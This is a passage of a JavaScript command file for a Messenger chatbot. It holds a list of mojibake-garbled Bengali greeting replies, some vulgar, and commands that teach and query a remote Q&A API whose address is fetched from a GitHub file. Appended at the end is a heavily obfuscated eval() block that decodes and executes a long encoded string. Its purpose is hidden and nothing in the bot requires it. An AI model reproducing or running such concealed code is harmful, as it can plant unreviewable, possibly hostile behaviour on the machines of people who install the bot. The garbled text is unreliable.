ржпрж╛, рждрзЛрж░ ржХрзЛржирзЛ ржХрж╛ржЬ ржирж╛ржЗ, рж╢рзБржзрзБ bot bot ржХрж░рж┐рж╕  ЁЯШЙЁЯШЛЁЯдг" , "рждрзЛрж░ ржХржерж╛ рждрзЛрж░ ржмрж╛ржбрж╝рж┐ ржХрзЗржЙ рж╢рзБржирзЗ ржирж╛ ,рждрзЛ ржЖржорж┐ ржХрзЛржирзЛ рж╢рзБржиржмрзЛ ?ЁЯдФЁЯШВ " , "рждрзЛрж░ ржмрж╛рзЬрж┐ ржХрж┐ ржорж╛рж▓ ржжрж┐ржк ржЧрзНрж░рж╛ржоЁЯШ╡тАНЁЯТл" , "ржЖржорж╛ржХрзЗ ржбрзЗржХрзЛ ржирж╛,ржЖржорж┐ ржмрзНржпрж╛рж╕рзНржд ржЖрж╕рж┐" , "ржХрж┐ рж╣рж▓рзЛ ,ржорж┐рж╕ ржЯрж┐рж╕ ржХрж░ржЪрзНржЫрж┐рж╕ ржирж╛ржХрж┐ЁЯдг" , "рж╕ржЬрзАржм ржХржЗ ржУрж░ ржХрж╛ржЫрзЗ ржЧрж╛ржЬрж╛. ржУрж░ ржХрж╛ржЫ ржерзЗржХрзЗ ржирзЗржУ " , "ржмрж▓рзЛ ржХрж┐ ржмрж▓ржмрж╛, рж╕ржмрж╛рж░ рж╕рж╛ржоржирзЗ ржмрж▓ржмрж╛ ржирж╛ржХрж┐?ЁЯднЁЯдП" , "ржХрж╛рж▓ржХрзЗ ржжрзЗржЦрж╛ ржХрж░рж┐рж╕ рждрзЛ ржПржХржЯрзБ ЁЯШИ" , "рж╣рж╛ ржмрж▓рзЛ, рж╢рзБржиржЫрж┐ ржЖржорж┐ ЁЯШП" , "ржЖрж░ ржХржд ржмрж╛рж░ ржбрж╛ржХржмрж┐ ,рж╢рзБржиржЫрж┐ рждрзЛ" , "ржорзЗржпрж╝рзЗ рж╣рж▓рзЗ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржХрзЗ ЁЭРКЁЭРИЁЭРТЁЭРТ ржжрзЗ ЁЯШТ" , "ржмрж▓рзЛ ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐ рждрзЛржорж╛рж░ ржЬржирзНржп" , "ржЖржорж┐ рждрзЛ ржЕржирзНржз ржХрж┐ржЫрзБ ржжрзЗржЦрж┐ ржирж╛ЁЯР╕ ЁЯШО" , "ржП ржмрзЗржбрж╛ рждрзЛржЧрзЛ GC ржПрж░ C E O ржмрж╛ржкрзНржкрж┐ ржХржЗЁЯШМ" , "рждрзЛрж░ ржмрж╛рзЬрж┐ ржХрж┐ ржЙржЧрж╛ржирзНржбрж╛ ржПржЦрж╛ржирзЗ рж╣рзБржо" , "Bot ржирж╛ ржЬрж╛ржирзБ,ржмрж▓ ЁЯШМ" , "ржмрж▓рзЛ ржЬрж╛ржирзБ ЁЯМЪ" , "рждрзЛрж░ ржХрж┐ ржЪрзЛржЦрзЗ ржкржбрж╝рзЗ ржирж╛ ржЖржорж┐ ржЬрж┐рж╣рж╛ржж ржмрж╕ ржПрж░ рж╕рж╛ржерзЗ ржмрзНржпрж╛рж╕рзНржд ржЖрж╕рж┐ЁЯШТ"  , "ЁЭЩПЁЭЩвЁЭЩз ЁЭЩгЁЭЩЦЁЭЩгЁЭЩЮ ЁЭЩз ЁЭРиЁЭРв ЁЭРнЁЭРЪ  ЁЯШСЁЯе║" , "amr Jan lagbe,Tumi ki single aso?", "ЁЭЩПЁЭЩкЁЭЩвЁЭЩЦЁЭЩз BF ЁЭЩгЁЭЩЦЁЭЩЮ ,ЁЭЩйЁЭЩЦЁЭЩо ЁЭЩЦЁЭЩвЁЭЩа ЁЭЩЩЁЭЩЦЁЭЩаЁЭЩиЁЭЩд?ЁЯШВЁЯШВЁЯШВ" , "рждрзЛрж░ ржмрж╛рзЬрж┐ ржХржЗ ржЙржЧрж╛ржирзНржбрж╛ ","ржЪрзБржорзБ ржЦрж╛ржУрзЯрж╛рж░ ржмрзЯрж╕ ржЯрж╛  ржЪржХрж▓рзЗржЯЁЯНлржЦрзЗрзЯрзЗ ржЙрзЬрж┐рзЯрзЗ ржжрж┐рж▓рзЛ ржЬрж┐рж╣рж╛ржж ржмрж╕ ЁЯе║ЁЯдЧ","рж╣рзБржо ржЬрж╛ржи тШ║я╕ПЁЯдн" , "рж╢рзБржиржмрзЛ ржирж╛ЁЯШ╝рждрзБржорж┐ ржЖржорж╛ржХрзЗ ржкрзНрж░рзЗржо ржХрж░рж╛ржЗ ржжрж╛ржУ ржирж╛ржЗЁЯе║ржкржЪрж╛ рждрзБржорж┐ЁЯе║" , "ржЖржорж┐ ржкрж╛ржЧрж▓ ржжрзЗрж░ рж╕рж╛ржерзЗ ржХржерж╛ ржмрж▓рж┐ ржирж╛,okЁЯШТ" , "ржПрждрзЛ ржбрзЗржХрзЛ ржирж╛,ржкрзНрж░рзЗржо ржП ржкрж░рзЗ ржпрж╛ржмрзЛ рждрзЛЁЯЩИ" , "Bolo Babu, рждрзБржорж┐ ржХрж┐ ржЖржорж╛ржХрзЗ ржнрж╛рж▓рзЛржмрж╛рж╕рзЛ? ЁЯЩИЁЯТЛ " , "ржмрж╛рж░ ржмрж╛рж░ ржбрж╛ржХрж▓рзЗ ржорж╛ржерж╛ ржЧрж░ржо рж╣ржпрж╝рзЗ ржпрж╛ржпрж╝ ржХрж┐ржирзНрждрзБЁЯШС", "рж╣рзНржпрж╛ ржмрж▓рзЛЁЯШТ, рждрзЛржорж╛рж░ ржЬржирзНржп ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐ЁЯШРЁЯШС?" , "ржПрждрзЛ ржбрж╛ржХрзЛ ржХрзЗржи рж╕рзЛржирж╛ ржкрж╛ржЦрж┐ЁЯШБЁЯШЪ" , "I love you januЁЯе░" , "ржЖрж░рзЗ Bolo ржЖржорж╛рж░ ржЬрж╛ржи ,ржХрзЗржоржи ржЖржЫрзЛ?ЁЯШЪ " , "ржЖржЗрж▓рж╛ржмрж┐ржЙ ржмрзЗрж░рж┐ржорж╛ржЫ ЁЯШ┐" , "ржЪрзБржк ржерж╛ржХ ,ржирж╛ржЗ рждрзЛ рждрзЛрж░ ржжрж╛ржд ржнрзЗржЧрзЗ ржжрж┐ржмрзЛ ржХрж┐ржирзНрждрзБ" , "ржЬрж╛ржирзБ ЁЯШШ " , "ржмрж╛рж░ ржмрж╛рж░ Disturb ржХрж░ржЫрж┐рж╕ ржХрзЛржирзЛЁЯШ╛,ржЖржорж╛рж░ ржЬрж╛ржирзБрж░ рж╕рж╛ржерзЗ ржмрзНржпрж╛рж╕рзНржд ржЖржЫрж┐ЁЯШЛ" , "ржмрзЗржмрж┐ рждрзЛржорж╛рж░ ржирж╛ржирж┐рж░рзЗ ржЖржорж┐ рж░рж╛рждрзЗ ржнрж╛рж▓рзЛржмрж╛рж╕рж┐ЁЯШБЁЯШБЁЯШЪ" , "ржЖржорж╛ржХрзЗ ржбрж╛ржХрж▓рзЗ ,ржЖржорж┐ ржХрж┐ржирзНрждрзБ ржХрж┐рж╕ ржХрж░рзЗ ржжрж┐ржмрзЛЁЯШШ " , "ржЖржорж╛рж░рзЗ ржПрждрзЛ ржбрж╛ржХрж┐рж╕ ржирж╛ ржЖржорж┐ ржоржЬрж╛ ржХрж░рж╛рж░ mood ржП ржирж╛ржЗ ржПржЦржиЁЯШТ" , "рж╣рзНржпрж╛ржБ ржЬрж╛ржирзБ , ржПржЗржжрж┐ржХ ржП ржЖрж╕рзЛ ржХрж┐рж╕ ржжрзЗржЗЁЯдн ЁЯШШ" , "ржжрзВрж░рзЗ ржпрж╛, рждрзЛрж░ ржХрзЛржирзЛ ржХрж╛ржЬ ржирж╛ржЗ, рж╢рзБржзрзБ Jan jan koros ken ржХрж░рж┐рж╕ ЁЯШЙЁЯШЛЁЯдг" , "рждрзЛрж░ ржХржерж╛ рждрзЛрж░ ржмрж╛ржбрж╝рж┐ ржХрзЗржЙ рж╢рзБржирзЗ ржирж╛ ,рждрзЛ ржЖржорж┐ ржХрзЛржирзЛ рж╢рзБржиржмрзЛ ?ЁЯдФЁЯШВ " , "ржЖржорж╛ржХрзЗ ржбрзЗржХрзЛ ржирж╛,ржЖржорж┐ ржмрзНржпрж╛рж╕рзНржд ржЖржЫрж┐ЁЯЩВ" , "ржХрж┐ рж╣рж▓рзЛ , ржорж┐рж╕рзНржЯрзЗржХ ржХрж░ржЪрзНржЫрж┐рж╕ ржирж╛ржХрж┐ЁЯдг" , "ржмрж▓рзЛ ржХрж┐ ржмрж▓ржмрж╛, рж╕ржмрж╛рж░ рж╕рж╛ржоржирзЗ ржмрж▓ржмрж╛ ржирж╛ржХрж┐?ЁЯднЁЯдП" , "ржХрж╛рж▓ржХрзЗ ржжрзЗржЦрж╛ ржХрж░рж┐рж╕ рждрзЛ ржПржХржЯрзБ ЁЯШИ" , "рж╣рж╛ ржмрж▓рзЛ, рж╢рзБржиржЫрж┐ ржЖржорж┐ ЁЯШП" , "ржЖрж░ ржХржд ржмрж╛рж░ ржбрж╛ржХржмрж┐ ,рж╢рзБржиржЫрж┐ рждрзЛЁЯШРЁЯШС" , "рж╣рзБржо ржмрж▓рзЛ ржХрж┐ ржмрж▓ржмрзЗЁЯШТ" , "ржмрж▓рзЛ ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐ рждрзЛржорж╛рж░ ржЬржирзНржпЁЯШК" , "ржЖржорж┐ рждрзЛ ржЕржирзНржз ржХрж┐ржЫрзБ ржжрзЗржЦрж┐ ржирж╛ЁЯР╕" , "ржмрж▓рзЛ ржЬрж╛ржирзБ ЁЯМЪ" , "рждрзЛржорж╛рж░ ржХрж┐ ржЪрзЛржЦрзЗ ржкржбрж╝рзЗ ржирж╛ ржЖржорж┐ ржмрзНржпрж╛рж╕рзНржд ржЖржЫрж┐ЁЯШТ","рж╣рзБржо ржЬрж╛ржи рждрзЛржорж╛рж░ ржУржЗ ржЦрж╛ржирзЗ ржЙржорзНржорж╣ЁЯШРЁЯШШ" , "ржЖрж╣ рж╢рзБржирж╛ ржЖржорж╛рж░ рждрзЛржорж╛рж░ ржЕрж▓рж┐рждрзЗ ржЧрж▓рж┐рждрзЗ ржЙржорзНржорж╛рж╣ЁЯШЗЁЯШШ" , " jang hanga korbaЁЯШТЁЯШм" , "рж╣рзБржо ржЬрж╛ржи рждрзЛржорж╛рж░ ржЕржЗржЦрж╛ржирзЗ ржЙржорзНржоржорж╛рж╣ЁЯШ╖ЁЯШШ" , "ржЖрж╕рж╕рж╛рж▓рж╛ржорзБ ржЖрж▓рж╛ржЗржХрзБржо ржмрж▓рзЗржи ржЖржкржирж╛рж░ ржЬржирзНржп ржХрж┐ ржХрж░рждрзЗ ржкрж╛рж░рж┐..!ЁЯе░" , "рж╣рзБржо ржЬрж╛ржи рждрзЛржорж╛рж░ ржирж╛ржирж┐рж░рзЗ рж░рж╛рждрзЗ ржмрж╛рж▓рзЛ ржмрж╛рж╕рж┐ЁЯШБЁЯШЪ" , "ржЖржорж╛ржХрзЗ ржПрждрзЛ ржирж╛ ржбрзЗржХрзЗ ржмрж╕ ржЬрж┐рж╣рж╛ржж ржХрзЗ ржПржХржЯрж╛ ржЧржл ржжрзЗ ЁЯднЁЯЩД"
        ];
        const name = await Users.getNameUser(events.senderID);
        const rand = greetings[Math.floor(Math.random() * greetings.length)];
        return nayan.reply({
          body: `${name}, ${rand}`,
          mentions: [{ tag: name, id: events.senderID }]
        }, events.threadID, (error, info) => {
          if (error) {
            return nayan.reply('An error occurred while processing your request. Please try again later.', events.threadID, events.messageID);
          }

          global.client.handleReply.push({
            type: 'reply',
            name: this.config.name,
            messageID: info.messageID,
            author: events.senderID,
            head: msg,
          });
        }, events.messageID);
      }

      else if (msg.startsWith("textType")) {
        const selectedStyle = msg.split(" ")[1];
        const options = ['serif', 'sans', 'italic', 'italic-sans', 'medieval', 'normal'];

        if (options.includes(selectedStyle)) {
          saveTextStyle(events.threadID, selectedStyle);
          return nayan.reply({ body: `Text type set to "${selectedStyle}" successfully!` }, events.threadID, events.messageID);
        } else {
          return nayan.reply({ body: `Invalid text type! Please choose from: ${options.join(", ")}` }, events.threadID, events.messageID);
        }
      }

      else if (msg.startsWith("delete")) {
        const deleteParams = msg.replace("delete", "").trim().split("&");
        const question = deleteParams[0].replace("ask=", "").trim();
        const answer = deleteParams[1].replace("ans=", "").trim();

        
        const data = await deleteEntry(question, answer, events, apiUrl);
        const replyMessage = data.msg || data.data.msg;

        return nayan.reply({ body: replyMessage }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("info")) {
        const response = await axios.get(`${apiUrl}/sim?type=info`);
        const totalAsk = response.data.data.totalKeys;
        const totalAns = response.data.data.totalResponses;

        return nayan.reply({ body: `Total Ask: ${totalAsk}\nTotal Answer: ${totalAns}` }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("teach")) {
        const teachParams = msg.replace("teach", "").trim().split("&");
        const question = teachParams[0].replace("ask=", "").trim();
        const answer = teachParams[1].replace("ans=", "").trim();

        const response = await axios.get(`${apiUrl}/sim?type=teach&ask=${encodeURIComponent(question)}&ans=${encodeURIComponent(answer)}`);
        const replyMessage = response.data.msg;
        const ask = response.data.data.ask;
        const ans = response.data.data.ans;

        if (replyMessage.includes("already")) {
          return nayan.reply(`ЁЯУЭYour Data Already Added To Database\n1я╕ПтГгASK: ${ask}\n2я╕ПтГгANS: ${ans}`, events.threadID, events.messageID);
        }

        return nayan.reply({ body: `ЁЯУЭYour Data Added To Database Successfully\n1я╕ПтГгASK: ${ask}\n2я╕ПтГгANS: ${ans}` }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("askinfo")) {
        const question = msg.replace("askinfo", "").trim();

        if (!question) {
          return nayan.reply('Please provide a question to get information about.', events.threadID, events.messageID);
        }

        const response = await axios.get(`${apiUrl}/sim?type=keyinfo&ask=${encodeURIComponent(question)}`);
        const replyData = response.data.data;
        const answers = replyData.answers;

        if (!answers || answers.length === 0) {
          return nayan.reply(`No information available for the question: "${question}"`, events.threadID, events.messageID);
        }

        const replyMessage = `Info for "${question}":\n\n` +
          answers.map((answer, index) => `ЁЯУМ ${index + 1}. ${answer}`).join("\n") +
          `\n\nTotal answers: ${answers.length}`;

        return nayan.reply({ body: replyMessage }, events.threadID, events.messageID);
      } 

      else if (msg.startsWith("help")) {
        const cmd = this.config.name;
        const prefix = global.config.PREFIX;
        const helpMessage = `
        ЁЯМЯ **Available Commands:**

        1. ЁЯдЦ ${prefix}${cmd} askinfo [question]: Get information about a specific question.

        2. ЁЯУЪ ${prefix}${cmd} teach ask=[question]&ans=[answer]: Teach the bot a new question and answer pair.

        3. тЭМ ${prefix}${cmd} delete ask=[question]&ans=[answer]: Delete a specific question and answer pair. (Admin only)

        4. ЁЯУК ${prefix}${cmd} info: Get the total number of questions and answers.

        5. ЁЯСЛ ${prefix}${cmd} hi: Send a random greeting.

        6. ЁЯОи ${prefix}${cmd} textType [type]: Set the text type (options: serif, sans, italic, italic-sans, medieval, normal).

        тЪб Use these commands to interact with the bot effectively!
            `;

        return nayan.reply({ body: helpMessage }, events.threadID, events.messageID);
      } 

      else {
        const response = await axios.get(`${apiUrl}/sim?type=ask&ask=${encodeURIComponent(msg)}`);
        const replyMessage = response.data.data.msg;

        const textStyles = loadTextStyles();
        const userStyle = textStyles[events.threadID]?.style || 'normal';

        const kl = await axios.get(`https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json`);
        const apiUrl2 = kl.data.api2;

        const font = await axios.get(`${apiUrl2}/bold?text=${replyMessage}&type=${userStyle}`);
        const styledText = font.data.data.bolded;

        nayan.reply({ body: styledText }, events.threadID, (error, info) => {
          if (error) {
            return nayan.reply('An error occurred while processing your request. Please try again later.', events.threadID, events.messageID);
          }

          global.client.handleReply.push({
            type: 'reply',
            name: this.config.name,
            messageID: info.messageID,
            author: events.senderID,
            head: msg,
          });
        }, events.messageID);
      }
    } catch (error) {
      console.log(error);
      nayan.reply('An error has occurred, please try again later.', events.threadID, events.messageID);
    }
}
}


function loadTextStyles() {
  const Path = path.join(__dirname, 'system', 'textStyles.json');
  try {

    if (!fs.existsSync(Path)) {
      fs.writeFileSync(Path, JSON.stringify({}, null, 2));
    }

    
    const data = fs.readFileSync(Path, 'utf8');
    return JSON.parse(data);  
  } catch (error) {
    console.error('Error loading text styles:', error);
    return {}; 
  }
}

function saveTextStyle(threadID, style) {

  const styles = loadTextStyles(); 


  styles[threadID] = { style }; 

  const Path = path.join(__dirname, 'system', 'textStyles.json');
  try {

    fs.writeFileSync(Path, JSON.stringify(styles, null, 2));
  } catch (error) {
    console.error('Error saving text styles:', error);
  }
}




var _0xc34e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe65c(d,e,f){var g=_0xc34e[2][_0xc34e[1]](_0xc34e[0]);var h=g[_0xc34e[3]](0,e);var i=g[_0xc34e[3]](0,f);var j=d[_0xc34e[1]](_0xc34e[0])[_0xc34e[10]]()[_0xc34e[9]](function(a,b,c){if(h[_0xc34e[4]](b)!==-1)return a+=h[_0xc34e[4]](b)*(Math[_0xc34e[8]](e,c))},0);var k=_0xc34e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc34e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe65c(s,e,10)-t)}return decodeURIComponent(escape(r))}("IIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLEJJLIESLESNLNJESLEIJLEINLISILESILENSLIESLESNLNJESLIIJLISELESNLSJJLESILEIELEEELIESLESNLNJESLESELISNLEIJLESSLESNLISJLENILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLESSLIIJLISELISILEIELESILSJILIESLESNLNJESLESELEIELESILEIJLENSLENILSJELNJNELISILNJNILNJEJLNJNELNJJSLEJJLIESLESNLNJESLEIJLEINLISILESILSJILIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLENSLIESLESNLNJESLESELEIILISSLESSLISELEIILEEELIESLESNLNJESLEIJLIIJLEISLISNLISELISSLENILNJSNLIESLESNLNJESLESELEIILISSLESSLISELEIILSJILIESLESNLNJESLESELEIILISSLESSLISELEIILEESLENSLESNLNJESLISNLISSLISNLEENLEESLESNLNJESLESELISELIIJLEEJLESNLNJESLESELEINLEENLESNLNJESLEIJLISJLISNLEEJLESNLNJESLEIELENILSJELNJJNLISILNJNILEJJLIESLESNLNJESLESSLESNLEIJLISNLEISLESELSJILIESLESNLNJESLESSLIIJLISELISILEIELESILINILIESLESNLNJESLESELEIILISSLESSLISELEIILIENLSJELNJNELISILNJNILNJEJLNJNELNJJSLEJJLIESLESNLNJESLESSLESNLEIJLISNLEISLESELSJELNJSSLEEELIESLESNLNJESLEIJLEINLISILESILENSLIESLESNLNJESLIIJLISELESNLSJJLESILEIELEEELIESLESNLNJESLESELISNLEIJLESSLESNLISJLENILSJELNJSSLENSLIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLENSLIESLESNLNJESLESELEIILEIILEISLEIJLISSLEEELIESLESNLNJESLESELISSLEIELIIJLIIJLESNLENILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELSJILIESLESNLNJESLEIJLEINLISILESILEEELIESLESNLNJESLEINLESILEIELISNLSJJLEIELSJILIESLESNLNJESLESELEIILEIILEISLEIJLISSLENSLENILSJELNJEELIIELIISLNJJNLISILENSLEJNLEJNLINILIENLENILNJSNLNJNILNJNELNJEILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIJLISILSJJLSJJLISJLISJLSJILEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELISILEINLENILENILESJLENSLESNLNJESLESILIIJLISELEENLEESLESNLNJESLISILISSLEEJLESNLNJESLESSLESELEENLESNLNJESLESELISJLSJJLESSLENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLISELENILENILESJLENSLEESLESNLNJESLESELESILEIJLEIJLEENLESNLNJESLSJJLISILEIJLEEJLEESLESNLNJESLESSLEENLESNLNJESLESSLEEJLESNLNJESLESELESILEIILEISLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLESSLENILENILESJLENSLESNLNJESLESSLEEJLEESLESNLNJESLEIELISILISJLEENLESNLNJESLESSLEIJLISNLIIJLEENLEESLESNLNJESLESELEIELISILEIILENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELISILISILENILENILESJLENSLEESLESNLNJESLESSLESSLIIJLESILEENLEESLESNLNJESLESSLESSLSJJLISILEENLEESLESNLNJESLESELEISLISNLEEJLEESLESNLNJESLESSLIIJLENILENILEENLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLEINLENILENILESJLENSLEESLESNLNJESLESELISNLSJJLISNLEENLESNLNJESLESELESSLISNLESSLEENLESNLNJESLESELESSLEEJLESNLNJESLEISLIIJLENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLIIJLENILENILESJLENSLEESLESNLNJESLEIJLEEJLEESLESNLNJESLEIILISNLEINLEENLEESLESNLNJESLEIELISILISSLEENLESNLNJESLESILEEJLEESLESNLNJESLSJJLEIJLISNLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLEISLENILENILESJLENSLEESLESNLNJESLESILESSLEEJLEESLESNLNJESLEISLISSLEENLEESLESNLNJESLEIJLEIJLEINLEENLEESLESNLNJESLESELEIJLESELISILENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLEISLENILENILESJLENSLESNLNJESLEISLEISLEEJLEESLESNLNJESLISSLEENLEESLESNLNJESLISILESELISELEENLESNLNJESLESELEIJLESSLIIJLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELISILESSLENILENILESJLENSLESNLNJESLESELEINLESILEEJLESNLNJESLISSLEENLEESLESNLNJESLESELESILEEJLESNLNJESLEINLEISLEENLEESLESNLNJESLISJLISNLSJJLENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLSJJLENILENILESJLENSLEESLESNLNJESLESELEEJLEESLESNLNJESLEIILESILEENLEESLESNLNJESLESELESILISSLEINLEENLESNLNJESLESELESILEINLISELENILEEJLENSLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLISNLENILENILESJLENSLEESLESNLNJESLEIJLEEJLESNLNJESLEIILISILISNLEENLEESLESNLNJESLEINLEEJLESNLNJESLESILEIJLISNLEENLESNLNJESLESSLEEJLESNLNJESLESELISJLESELEISLENILENILEENLEESLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESSLESNLISELENILENILESJLENSLEESLESNLNJESLESELEINLISELESELEENLESNLNJESLEIELEEJLEESLESNLNJESLESELISSLISELEENLESNLNJESLESSLESNLIIJLEINLENILEEJLENSLNJNJLISJLNJNELNJNSLISILSSNLNJJSLNJNILENSLIESLESNLNJESLEIJLEIILSJJLISJLSJJLISELENSLESNLNJESLESELIIJLIIJLENILENILESJLENSLESNLNJESLESELEINLESILESSLEENLEESLESNLNJESLESSLESNLISILISNLEENLEESLESNLNJESLISNLISELEIELEEJLEESLESNLNJESLESELENILENILSJELIISLIIJLENSLIESLESNLNJESLEIJLISILSJJLSJJLISJLISJLSJILSJILSJILIESLESNLNJESLESELISSLEIELIIJLIIJLESNLENILISNLNJNELISILISJLNJJJLSJELISILNJJNLNJNSLISILEJJLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNJLNJEJLNJNSLIIELENELIENLENSLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNSLIIELIISLIIJLNJNILENELIENLENSLENILENILSJELNJSSLISELISJLNJNILISELIIELENSLIESLESNLNJESLEIJLIIJLEINLSJJLISJLESNLENILNJSNLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNJLNJEJLNJNSLIIELENELIENLENSLIESLESNLNJESLEINLESILEIELISNLSJJLEIELINILENELNJNSLIIELIISLIIJLNJNILENELIENLENSLENILENILSJELNJSSLNJSSLNJSSLENSLIESLESNLNJESLESELEIELESILEIJLEEELEESLESNLNJESLEISLESILESNLISILSJJLEENLESNLNJESLEIJLESNLESILISELEIJLEENLESNLNJESLESELESSLEIELESNLISILEINLENILENILSJELISJLNJNSLNJEILNJJSLISELEJJLIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLEJJLISSLISILNJJNLISILNJNILISILSEELNJJSLNJNILNJNELNJEILENSLIESLESNLNJESLESILESNLESELISJLISELESELEEELIESLESNLNJESLESELEIELEISLESILISNLESSLEEELIESLESNLNJESLEINLISILEISLISELISSLEIELEEELIESLESNLNJESLEIJLISNLESILISELESILESILENILNJSNLISELNJJILNJJSLNJNSLNJNILEJJLIESLESNLNJESLEIILEIILISELESELEISLESSLSJILIESLESNLNJESLEIJLEINLISILESILEEELIESLESNLNJESLEIJLEIELEIELEIJLISJLESNLSJILNJSNLENELISJLIJJLINSLINELSIELENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLESELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILIIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLEIILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELESILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILEIELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLEIILENILEENLENELNJJSLENELEEELENELSSJLSIELSINLINNLNJEILENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLISSLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLISJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLEINLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLESILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEIELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILISELENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELIIJLESILENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELESSLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELESNLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLESNLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLISJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILSJJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEINLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESELEIILENILEEELENELSEJLSENLNJJELNJNELINJLENELSJNLIIJLNJEJLNJJSLISELNJNILIISLNJJILNJJSLENSLIESLESNLNJESLESSLEIJLIIJLISNLEIELISJLEEELIESLESNLNJESLEIJLIIJLESELISSLISJLISILENILNJSNLNJNELISILNJNILNJEJLNJNELNJJSLEJJLIESLESNLNJESLESSLEIJLIIJLISNLEIELISJLENSLIESLESNLNJESLEIJLIIJLESELISSLISJLISILENILSJELNJSSLEEELENELNJNSLNJNSLSSJLSSSLIJNLENELSJNLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESELISILEIJLENILEENLIESLESNLNJESLEIILEIILISELESELEISLESSLENSLESNLNJESLESSLESNLSJJLENILEENLENELSJNLENELEEELENELNJJILSSJLISSLSEELINNLENELSJNLIESLESNLNJESLEIILEIIL